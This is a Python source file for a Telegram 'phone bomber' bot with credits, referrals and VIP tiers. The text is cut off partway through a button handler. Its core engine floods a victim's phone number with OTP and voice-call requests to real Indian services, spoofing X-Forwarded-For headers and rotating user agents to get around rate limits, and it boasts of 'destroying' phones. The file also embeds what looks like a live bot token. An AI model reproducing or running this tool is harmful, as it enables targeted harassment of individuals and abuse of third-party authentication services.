# -*- coding: utf-8 -*-
"""
ULTIMATE TELEGRAM BOMBER BOT V3.0 - WITH BACK BUTTONS & PROTECTED NUMBERS
Bot by @NotYoursNaruto | Made by Naruto
Shadow Cat Industries - Classified
"""

import asyncio
import aiohttp
import time
import random
import json
import sqlite3
import os
import sys
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============= CONFIGURATION =============
BOT_TOKEN = "8940969112:AAGLNZK7nxxiZoEw3J2jU1g2jySQjUXbq9k"  # REPLACE WITH YOUR TOKEN
BOT_OWNER = "NotYoursNaruto"  # Your username
BOT_NAME = "ULTIMATE PHONE DESTROYER"
VERSION = "V3.0"
ADMIN_IDS = [8206978592]  # Add your admin user IDs here
DEFAULT_CREDITS = 5  # Free credits for new users
BOMB_COST = 1  # Credits per bomb session
VIP_USERS = []  # VIP user IDs get unlimited bombing
REFERRAL_BONUS = 2  # Credits for referring someone
NOTIFY_OWNER = True  # Set to False to disable notifications

# ============= ANIMATED EMOJI CONFIGURATION =============
ANIMATED_EMOJIS = {
    "🚀": "5258332798409783582",
    "💥": "5888974760720732797",
    "💣": "5134377151734219769",
    "⚡": "5843553939672274145",
    "🔥": "6053166094816905153",
    "💀": "6188110286470253001",
    "🎯": "5310278924616356636",
    "⏰": "5985616167740379273",
    "🛑": "5296258510684712098",
    "🔄": "5877410604225924969",
    "💰": "5778311685638984859",
    "🎁": "6032937473162614352",
    "💳": "5936017305585586269",
    "📊": "5931472654660800739",
    "🏆": "5312160339335347417",
    "👑": "5373346752671804066",
    "💎": "6028530359975548369",
    "👋": "5994750571041525522",
    "👤": "5879770735999717115",
    "👥": "5942877472163892475",
    "🎉": "5994502837327892086",
    "🏅": "5444931419270839381",
    "📞": "5897488197650223178",
    "📱": "5985833664884250583",
    "💬": "5884510167986343350",
    "📨": "5985817223749439505",
    "✅": "5776375003280838798",
    "❌": "5778527486270770928",
    "⚠️": "5420323339723881652",
    "🚨": "6073511595416228178",
    "📢": "5771695636411847302",
    "🔔": "5909201569898827582",
    "📖": "5778184941154078090",
    "⬅️": "5832251986635920010",
    "🔮": "5460980668378931880",
}

def e(text: str) -> str:
    """Replace standard emojis with Telegram premium animated emoji syntax."""
    for emoji, animated_id in ANIMATED_EMOJIS.items():
        if emoji in text:
            text = text.replace(emoji, f"<tg-emoji emoji-id=\"{animated_id}\">{emoji}</tg-emoji>")
    return text

# ============= DATABASE SETUP =============
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('bomber_bot.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self._create_tables()

    def _create_tables(self):
        """Create necessary tables"""
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                credits INTEGER DEFAULT 0,
                total_bombs INTEGER DEFAULT 0,
                total_success INTEGER DEFAULT 0,
                join_date TEXT,
                is_vip INTEGER DEFAULT 0,
                referred_by INTEGER DEFAULT NULL,
                referral_count INTEGER DEFAULT 0,
                first_name TEXT
            )
        ''')

        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS transactions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount INTEGER,
                type TEXT,
                description TEXT,
                timestamp TEXT
            )
        ''')

        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS referrals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id INTEGER,
                referee_id INTEGER,
                bonus_claimed INTEGER DEFAULT 0,
                timestamp TEXT
            )
        ''')

        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS protected_numbers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT UNIQUE,
                label TEXT DEFAULT 'Owner',
                added_on TEXT
            )
        ''')

        self.conn.commit()
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN first_name TEXT")
            self.conn.commit()
        except Exception:
            pass

    def get_user(self, user_id):
        self.cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        user = self.cursor.fetchone()
        if not user:
            self.cursor.execute('''
                INSERT INTO users (user_id, credits, join_date)
                VALUES (?, ?, ?)
            ''', (user_id, DEFAULT_CREDITS, datetime.now().isoformat()))
            self.conn.commit()
            self.cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
            user = self.cursor.fetchone()
        return user

    def update_profile(self, user_id, username, first_name):
        self.cursor.execute(
            "UPDATE users SET username=?, first_name=? WHERE user_id=?",
            (username, first_name, user_id)
        )
        self.conn.commit()

    def get_credits(self, user_id):
        user = self.get_user(user_id)
        return user[2] if user else 0

    def add_credits(self, user_id, amount, description=""):
        self.cursor.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, user_id))
        self.cursor.execute('''
            INSERT INTO transactions (user_id, amount, type, description, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, amount, "ADD", description, datetime.now().isoformat()))
        self.conn.commit()
        return True

    def remove_credits(self, user_id, amount, description=""):
        current = self.get_credits(user_id)
        if current < amount:
            return False
        self.cursor.execute('UPDATE users SET credits = credits - ? WHERE user_id = ?', (amount, user_id))
        self.cursor.execute('''
            INSERT INTO transactions (user_id, amount, type, description, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, -amount, "REMOVE", description, datetime.now().isoformat()))
        self.conn.commit()
        return True

    def is_vip(self, user_id):
        user = self.get_user(user_id)
        return user[6] == 1 if user else False

    def get_top_users(self, limit=10):
        self.cursor.execute('''
            SELECT user_id, username, first_name, credits, total_bombs, total_success
            FROM users
            ORDER BY credits DESC
            LIMIT ?
        ''', (limit,))
        return self.cursor.fetchall()

    def get_stats(self):
        self.cursor.execute('SELECT COUNT(*) FROM users')
        total_users = self.cursor.fetchone()[0]
        self.cursor.execute('SELECT SUM(total_bombs) FROM users')
        total_bombs = self.cursor.fetchone()[0] or 0
        self.cursor.execute('SELECT SUM(total_success) FROM users')
        total_success = self.cursor.fetchone()[0] or 0
        self.cursor.execute('SELECT SUM(referral_count) FROM users')
        total_referrals = self.cursor.fetchone()[0] or 0
        return {
            "total_users": total_users,
            "total_bombs": total_bombs,
            "total_success": total_success,
            "total_referrals": total_referrals
        }

    def add_protected_number(self, user_id, phone_number, label="Owner"):
        self.cursor.execute('''
            INSERT OR REPLACE INTO protected_numbers (user_id, phone, label, added_on)
            VALUES (?, ?, ?, ?)
        ''', (user_id, phone_number, label, datetime.now().isoformat()))
        self.conn.commit()

    def get_protected_numbers(self, user_id=None):
        if user_id:
            self.cursor.execute('SELECT phone, label FROM protected_numbers WHERE user_id = ?', (user_id,))
        else:
            self.cursor.execute('SELECT user_id, phone, label FROM protected_numbers')
        return self.cursor.fetchall()

    def is_number_protected(self, phone):
        self.cursor.execute('SELECT user_id, label FROM protected_numbers WHERE phone = ?', (phone,))
        return self.cursor.fetchone()

    def remove_protected_number(self, phone):
        self.cursor.execute('DELETE FROM protected_numbers WHERE phone = ?', (phone,))
        self.conn.commit()
        return self.cursor.rowcount > 0

    def close(self):
        self.conn.close()

db = Database()

def display_name(uid: int, username, first_name) -> str:
    if username:
        return f"@{username}"
    name = first_name or str(uid)
    return f'<a href="tg://user?id={uid}">{name}</a>'

# ============= FIXED NOTIFICATION FUNCTION =============
async def notify_owner(context, user_id, username, phone, duration, is_vip):
    """Send notification to owner when someone uses the bot"""
    if not NOTIFY_OWNER:
        return
    
    owner_id = ADMIN_IDS[0]
    try:
        user = db.get_user(user_id)
        credits = user[2] if user else 0
        total_bombs = user[3] if user else 0
        first_name = user[9] if user and len(user) > 9 else "User"
        
        if username:
            user_display = f"@{username}"
        else:
            user_display = f'<a href="tg://user?id={user_id}">{first_name}</a>'
        
        # Build message WITHOUT using e() function to avoid conflicts
        message = f"""
📡 <b>💥 BOMBING ALERT! 💥</b>

👤 <b>User:</b> {user_display}
🆔 <b>User ID:</b> <code>{user_id}</code>
📱 <b>Target:</b> <code>+91{phone}</code>
⏰ <b>Duration:</b> {duration}s
👑 <b>VIP:</b> {'✅ YES' if is_vip else '❌ NO'}
💰 <b>Credits:</b> {credits}
💣 <b>Total Bombs:</b> {total_bombs}

🔔 <b>Timestamp:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

💀 <b>Bot by @{BOT_OWNER}</b>
"""
        
        # Send with e() function applied to the whole message
        await context.bot.send_message(owner_id, e(message), parse_mode="HTML")
        print(f"✅ Notification sent to owner for user {user_id} bombing {phone}")
        
    except Exception as error:
        print(f"⚠️ Failed to send owner notification: {error}")
        try:
            await context.bot.send_message(
                owner_id,
                f"⚠️ BOMBING ALERT!\nUser: {user_id}\nTarget: +91{phone}\nDuration: {duration}s"
            )
        except Exception as fallback_error:
            print(f"⚠️ Fallback notification also failed: {fallback_error}")

def log_bombing(user_id, username, phone, duration, is_vip, status="STARTED"):
    """Log bombing activity to file"""
    try:
        log_entry = f"[{datetime.now().isoformat()}] {status} | User: {user_id} (@{username}) | Target: +91{phone} | Duration: {duration}s | VIP: {is_vip}\n"
        with open("bombing_log.txt", "a", encoding='utf-8') as f:
            f.write(log_entry)
    except Exception as error:
        print(f"⚠️ Failed to write log: {error}")

# ============= ULTIMATE APIS (SHORTENED FOR SPACE) =============
ULTIMATE_APIS = [
    {"name": "Tata Capital Voice Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Myntra Voice Call", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart Voice Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Amazon Voice Call", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&action=voice_otp"},
    {"name": "Paytm Voice Call", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Zomato Voice Call", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&type=voice"},
]

# ============= BOMBER ENGINE =============
class TelegramBomber:
    def __init__(self):
        self.active_jobs = {}
        self.bomb_stats = {}
        self._lock = asyncio.Lock()

    async def bomb_phone(self, phone, duration=60):
        job_id = f"{phone}_{int(time.time())}"
        async with self._lock:
            self.active_jobs[job_id] = True
        stats = {"total": 0, "success": 0, "failed": 0, "calls": 0, "whatsapp": 0, "sms": 0, "apis_hit": set()}
        async with self._lock:
            self.bomb_stats[job_id] = stats
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for api in ULTIMATE_APIS:
                async with self._lock:
                    if not self.active_jobs.get(job_id, False):
                        break
                task = asyncio.create_task(self._send_request(session, api, phone, job_id))
                tasks.append(task)
            end_time = time.time() + duration
            while time.time() < end_time:
                async with self._lock:
                    if not self.active_jobs.get(job_id, False):
                        break
                await asyncio.sleep(1)
            for task in tasks:
                if not task.done():
                    task.cancel()
        async with self._lock:
            self.active_jobs[job_id] = False
        return self.bomb_stats.get(job_id, stats)

    async def _send_request(self, session, api, phone, job_id):
        while True:
            async with self._lock:
                if not self.active_jobs.get(job_id, False):
                    break
            try:
                name = api["name"]
                url = api["url"](phone) if callable(api["url"]) else api["url"]
                headers = api["headers"].copy()
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers["User-Agent"] = random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15"
                ])
                stats = self.bomb_stats.get(job_id)
                if stats:
                    stats["total"] += 1
                    if "call" in name.lower() or "voice" in name.lower():
                        stats["calls"] += 1
                    elif "whatsapp" in name.lower():
                        stats["whatsapp"] += 1
                    else:
                        stats["sms"] += 1
                if api["method"] == "POST":
                    data = api["data"](phone) if api["data"] else None
                    async with session.post(url, headers=headers, data=data, timeout=3, ssl=False) as response:
                        if response.status in [200, 201, 202, 204]:
                            if stats:
                                stats["success"] += 1
                                stats["apis_hit"].add(name)
                        else:
                            if stats:
                                stats["failed"] += 1
                else:
                    async with session.get(url, headers=headers, timeout=3, ssl=False) as response:
                        if response.status in [200, 201, 202, 204]:
                            if stats:
                                stats["success"] += 1
                                stats["apis_hit"].add(name)
                        else:
                            if stats:
                                stats["failed"] += 1
                await asyncio.sleep(random.uniform(0.001, 0.02))
            except Exception:
                stats = self.bomb_stats.get(job_id)
                if stats:
                    stats["failed"] += 1
                continue

    def stop_job(self, job_id):
        if job_id in self.active_jobs:
            self.active_jobs[job_id] = False
            return True
        return False

    def get_active_jobs(self):
        return [job_id for job_id, active in self.active_jobs.items() if active]

bomber = TelegramBomber()

# ============= TELEGRAM BOT HANDLERS =============

def get_branding():
    return e(f"""
╔══════════════════════════════════════╗
║    💀 {BOT_NAME} {VERSION} 💀    ║
║        Bot by @{BOT_OWNER}          ║
║      Made by Naruto ⚡           ║
╚══════════════════════════════════════╝
""")

def get_user_info(user_id, username="Unknown"):
    user = db.get_user(user_id)
    credits = user[2] if user else 0
    total_bombs = user[3] if user else 0
    total_success = user[4] if user else 0
    is_vip = user[6] if user else 0
    referral_count = user[8] if user else 0
    return {
        "credits": credits,
        "total_bombs": total_bombs,
        "total_success": total_success,
        "is_vip": is_vip,
        "referral_count": referral_count
    }

def get_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("💥 Bomb Now", callback_data="bomb")],
        [InlineKeyboardButton("💰 Credits", callback_data="credits")],
        [InlineKeyboardButton("👑 VIP", callback_data="vip")],
        [InlineKeyboardButton("👥 Referral", callback_data="refer")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
        [InlineKeyboardButton("🏆 Top Users", callback_data="top")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_keyboard(back_callback="main"):
    keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data=back_callback)]]
    return InlineKeyboardMarkup(keyboard)

# ============= START COMMAND =============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name or "User"
    db.get_user(user_id)
    db.update_profile(user_id, username, first_name)
    
    if context.args and context.args[0].isdigit():
        referrer_id = int(context.args[0])
        if referrer_id != user_id:
            db.cursor.execute('SELECT * FROM referrals WHERE referee_id = ?', (user_id,))
            if not db.cursor.fetchone():
                db.cursor.execute('''
                    INSERT INTO referrals (referrer_id, referee_id, timestamp)
                    VALUES (?, ?, ?)
                ''', (referrer_id, user_id, datetime.now().isoformat()))
                db.add_credits(referrer_id, REFERRAL_BONUS, f"Referral bonus from {username}")
                db.cursor.execute('''
                    UPDATE users SET referral_count = referral_count + 1 WHERE user_id = ?
                ''', (referrer_id,))
                db.conn.commit()
                await update.message.reply_text(
                    e(f"🎉 <b>Referral Successful!</b>\n\n"
                      f"@{username} has been referred by you.\n"
                      f"You received +{REFERRAL_BONUS} credits!"),
                    parse_mode="HTML"
                )
    
    user_info = get_user_info(user_id, username)
    welcome_text = e(f"""
{get_branding()}
👋 <b>Welcome, @{username}!</b>

📊 <b>Your Stats:</b>
💰 Credits: {user_info['credits']}
💣 Total Bombs: {user_info['total_bombs']}
✅ Total Success: {user_info['total_success']}
👑 VIP: {'✅ Yes' if user_info['is_vip'] else '❌ No'}
👥 Referrals: {user_info['referral_count']}

⚡ <b>Commands:</b>
/bomb &lt;number&gt; [duration] - Bomb a number
/stop - List/stop active jobs
/credits - Check your credits
/buy - How to get more credits
/refer - Get your referral link
/stats - Bot statistics
/top - Top users leaderboard
/help - Show all commands
/testnotify - Test owner notification

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
""")
    await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")

# ============= BOMB COMMAND =============
async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    user_info = get_user_info(user_id, username)
    args = context.args
    
    if not args:
        await update.message.reply_text(
            e("❌ <b>Usage:</b> /bomb &lt;10-digit phone number&gt; [duration]\n"
              "Example: /bomb 9876543210 30\n\n"
              f"💰 Cost: {BOMB_COST} credit per bomb (FREE for VIP users!)"),
            parse_mode="HTML"
        )
        return
    
    phone = args[0]
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text(e("❌ Invalid number! Must be exactly 10 digits."), parse_mode="HTML")
        return
    
    protected = db.is_number_protected(phone)
    if protected:
        owner_id, label = protected
        await update.message.reply_text(
            e(f"🔥 <b>PROTECTED NUMBER!</b>\n\n"
              f"📱 {phone} is registered as <b>{label}</b>'s personal number.\n"
              f"💀 <b>Acha lode baap ko seekhayega</b>\n\n"
              f"🛡️ This number is under Shadow's protection.\n"
              f"👑 Try again with a different target."),
            parse_mode="HTML"
        )
        print(f"⚠️ BLOCKED: User {user_id} tried to bomb protected number {phone} (Owner: {label})")
        return
    
    duration = 60
    if len(args) > 1 and args[1].isdigit():
        duration = int(args[1])
    
    # ===== NOTIFY OWNER =====
    await notify_owner(context, user_id, username, phone, duration, user_info['is_vip'])
    log_bombing(user_id, username, phone, duration, user_info['is_vip'], "STARTED")
    
    if not user_info['is_vip']:
        if user_info['credits'] < BOMB_COST:
            await update.message.reply_text(
                e(f"❌ <b>Insufficient Credits!</b>\n\n"
                  f"You need {BOMB_COST} credit to bomb.\n"
                  f"Your balance: {user_info['credits']} credits\n\n"
                  f"Use /buy to get more credits or /refer to earn free credits!"),
                parse_mode="HTML"
            )
            return
        if not db.remove_credits(user_id, BOMB_COST, f"Bombing +91{phone}"):
            await update.message.reply_text(e("❌ Failed to deduct credits. Please try again."), parse_mode="HTML")
            return
    
    remaining = user_info['credits'] - BOMB_COST
    vip_line = "👑 VIP Mode: Unlimited Power!" if user_info['is_vip'] else f"💰 Credits Remaining: {remaining}"
    job_id = f"{phone}_{int(time.time())}"
    
    status_msg = await update.message.reply_text(
        e(f"🚀 <b>Starting bombardment on +91{phone}</b>\n"
          f"⏰ Duration: {duration} seconds\n"
          f"💣 APIs: {len(ULTIMATE_APIS)} loaded\n"
          f"{vip_line}\n"
          f"🔄 Please wait...\n\n"
          f"💀 <b>Bot by @{BOT_OWNER}</b>"),
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🛑 STOP BOMBING", callback_data=f"stop_{job_id}")]
        ]),
        parse_mode="HTML"
    )
    
    context.bot_data[job_id] = {
        "phone": phone,
        "duration": duration,
        "start_time": time.time(),
        "status_msg": status_msg,
        "stats": None
    }
    asyncio.create_task(run_bombing_job(context, job_id, phone, duration, user_id))

async def run_bombing_job(context, job_id, phone, duration, user_id):
    stats = await bomber.bomb_phone(phone, duration)
    if job_id in context.bot_data:
        context.bot_data[job_id]["stats"] = stats
        user = db.get_user(user_id)
        db.cursor.execute('''
            UPDATE users SET total_bombs = total_bombs + 1, total_success = total_success + ?
            WHERE user_id = ?
        ''', (stats['success'], user_id))
        db.conn.commit()
        status_msg = context.bot_data[job_id]["status_msg"]
        elapsed = time.time() - context.bot_data[job_id]["start_time"]
        report = e(f"""
✅ <b>Bombing Complete!</b>

📱 Target: +91{phone}
⏰ Duration: {elapsed:.1f}s
💥 Total Attacks: {stats['total']}
✅ Success: {stats['success']}
❌ Failed: {stats['failed']}
📞 Calls Sent: {stats['calls']}
📱 WhatsApp: {stats['whatsapp']}
💬 SMS Sent: {stats['sms']}
🎯 Unique APIs: {len(stats['apis_hit'])}
""")
        if stats['success'] > 2000:
            report += e("\n☠️ <b>PHONE COMPLETELY DESTROYED!</b>")
        elif stats['success'] > 1000:
            report += e("\n🔥 <b>PHONE HANGED SUCCESSFULLY!</b>")
        elif stats['success'] > 500:
            report += e("\n⚡ <b>Phone severely damaged!</b>")
        elif stats['success'] > 100:
            report += e("\n🎯 <b>Bombing successful!</b>")
        else:
            report += e("\n⚠️ <b>Limited damage inflicted.</b>")
        report += e(f"\n\n💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>")
        try:
            await status_msg.edit_text(report, parse_mode="HTML")
        except Exception:
            pass

# ============= STOP COMMAND =============
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        active_jobs = bomber.get_active_jobs()
        if not active_jobs:
            await update.message.reply_text(
                e("📭 <b>No active bombing jobs.</b>\n\n"
                  "💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>"),
                parse_mode="HTML"
            )
            return
        text = e("🛑 <b>Active Bombing Jobs</b>\n\n")
        for job in active_jobs:
            phone = job.split('_')[0]
            text += f"📱 +91{phone} — {job}\n"
        text += e(f"\nUse: <code>/stop &lt;job_id&gt;</code> to stop a job.\n"
                  f"Example: <code>/stop {active_jobs[0]}</code>\n\n"
                  f"💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>")
        await update.message.reply_text(text, parse_mode="HTML")
        return
    job_id = args[0]
    if bomber.stop_job(job_id):
        await update.message.reply_text(
            e(f"🛑 <b>Bombing Stopped!</b>\n\n"
              f"📱 Job ID: <code>{job_id}</code>\n"
              f"✅ Successfully terminated.\n\n"
              f"💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>"),
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(
            e(f"❌ <b>Job not found!</b>\n\n"
              f"📱 Job ID: <code>{job_id}</code>\n"
              f"⚠️ This job is either already stopped or doesn't exist.\n\n"
              f"Use <code>/stop</code> to see active jobs.\n\n"
              f"💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>"),
            parse_mode="HTML"
        )

# ============= TEST NOTIFICATION COMMAND =============
async def test_notify_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test owner notification"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text(e("❌ You are not authorized to use this command."), parse_mode="HTML")
        return
    
    await notify_owner(
        context, 
        update.effective_user.id, 
        update.effective_user.username or "TestUser", 
        "9876543210", 
        30, 
        False
    )
    
    await update.message.reply_text(
        e("✅ <b>Test notification sent!</b>\n\n"
          "Check your DM for the notification.\n"
          "If you didn't receive it, check:\n"
          "1. Bot has permission to message you (send /start first)\n"
          "2. NOTIFY_OWNER is set to True\n"
          "3. ADMIN_IDS contains your ID"),
        parse_mode="HTML"
    )

# ============= CREDITS, BUY, REFER, STATS, TOP, HELP =============
async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name or "User"
    db.update_profile(user_id, username, first_name)
    user_info = get_user_info(user_id, username)
    await update.message.reply_text(
        e(f"""
💰 <b>Your Credits</b>

👤 User: @{username}
👑 VIP: {'✅ Yes' if user_info['is_vip'] else '❌ No'}
💰 Credits: {user_info['credits']}
💣 Total Bombs: {user_info['total_bombs']}
✅ Total Success: {user_info['total_success']}
👥 Referrals: {user_info['referral_count']}

📊 <b>Credit Usage:</b>
- Bomb cost: {BOMB_COST} credit per attack
- Referral bonus: +{REFERRAL_BONUS} credits
- Free credits on join: +{DEFAULT_CREDITS} credits

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
        parse_mode="HTML"
    )

async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        e(f"""
💳 <b>Get More Credits</b>

🎁 <b>Free Methods:</b>
1️⃣ Use /refer - Share your referral link
2️⃣ Get +{REFERRAL_BONUS} credits per referral
3️⃣ Join our channel for free credits

👑 <b>VIP Membership:</b>
- Unlimited bombing
- No credit costs
- Priority support
- Exclusive features

📞 <b>Contact Admin:</b> DM @{BOT_OWNER} for VIP access

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
        parse_mode="HTML"
    )

async def refer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name or "User"
    db.update_profile(user_id, username, first_name)
    user_info = get_user_info(user_id, username)
    referral_link = f"https://t.me/{(await context.bot.get_me()).username}?start={user_id}"
    await update.message.reply_text(
        e(f"""
👥 <b>Referral Program</b>

📤 <b>Your Referral Link:</b>
<code>{referral_link}</code>

📊 <b>Your Referrals: {user_info['referral_count']}</b>
💰 Bonus per referral: +{REFERRAL_BONUS} credits

🎯 <b>How it works:</b>
1. Share your link with friends
2. They join using your link
3. You get +{REFERRAL_BONUS} credits
4. They get {DEFAULT_CREDITS} free credits!

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
        parse_mode="HTML"
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = db.get_stats()
    await update.message.reply_text(
        e(f"""
📊 <b>Bot Statistics</b>

👥 Total Users: {stats['total_users']}
💣 Total Bombs: {stats['total_bombs']}
✅ Total Success: {stats['total_success']}
👥 Total Referrals: {stats['total_referrals']}
🔥 APIs Loaded: {len(ULTIMATE_APIS)}

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
        parse_mode="HTML"
    )

async def top_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    top_users = db.get_top_users(10)
    if not top_users:
        await update.message.reply_text(e("❌ No users yet!"), parse_mode="HTML")
        return
    text = e("🏆 <b>Top Users Leaderboard</b>\n\n")
    for i, user in enumerate(top_users, 1):
        uid_db, uname_db, fname_db, credits, _, _ = user
        medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
        text += e(f"{medal} ") + display_name(uid_db, uname_db, fname_db) + e(f" - {credits} credits 💰\n")
    text += e(f"\n💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>")
    await update.message.reply_text(text, parse_mode="HTML")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        e(f"""
📖 <b>Available Commands</b>

✅ <b>User Commands:</b>
/start - Welcome message
/bomb &lt;number&gt; [duration] - Bomb a number
/stop [job_id] - Stop an active bombing job (or list all)
/credits - Check your credits
/buy - Get more credits
/refer - Get referral link
/stats - Bot statistics
/top - Top users leaderboard
/help - This message

👑 <b>Admin Commands:</b>
/addcredits &lt;user_id&gt; &lt;amount&gt; - Add credits
/removecredits &lt;user_id&gt; &lt;amount&gt; - Remove credits
/addvip &lt;user_id&gt; - Make user VIP
/removevip &lt;user_id&gt; - Remove VIP status
/giveall &lt;amount&gt; - Give credits to all users
/broadcast &lt;message&gt; - Broadcast message
/users - Show all users
/adminstats - Advanced admin stats
/protect &lt;number&gt; [label] - Protect a number from bombing
/unprotect &lt;number&gt; - Remove protection from a number
/protected - List all protected numbers
/testnotify - Test owner notification

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
        parse_mode="HTML"
    )

# ============= BUTTON CALLBACK =============
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    data = query.data
    
    if data == "main":
        user_info = get_user_info(user_id, username)
        text = e(f"""
{get_branding()}
👋 <b>Welcome back, @{username}!</b>

📊 <b>Your Stats:</b>
💰 Credits: {user_info['credits']}
💣 Total Bombs: {user_info['total_bombs']}
✅ Total Success: {user_info['total_success']}
👑 VIP: {'✅ Yes' if user_info['is_vip'] else '❌ No'}
👥 Referrals: {user_info['referral_count']}

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
""")
        await query.edit_message_text(text, reply_markup=get_main_keyboard(), parse_mode="HTML")
    
    elif data == "bomb":
        await query.edit_message_text(
            e(f"""
💥 <b>Bomb Control Center</b>

📱 <b>Send a 10-digit phone number to start bombing.</b>
Use: /bomb 9876543210 60

💰 <b>Cost:</b> {BOMB_COST} credit per attack
👑 <b>VIP:</b> FREE unlimited bombing!

🎯 <b>Quick Actions:</b>
• 30 seconds - Fast attack
• 60 seconds - Standard attack
• 120 seconds - Maximum damage

💀 <b>Bot by @{BOT_OWNER} | Made by Naruto</b>
"""),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⚡ 30s", callback_data="bomb_30"),
                 InlineKeyboardButton("🔥 60s", callback_data="bomb_60"),
                 InlineKeyboardButton("💀 120s", callback_data="bomb_120")],
                [InlineKeyboardButton("⬅️ Back", callback_data="main")]
            ]),
            parse_mode="HTML"
        )
    
    elif data == "credits":
        user_info = get_user_info(user_id, username)
        await query.edit_message_text(
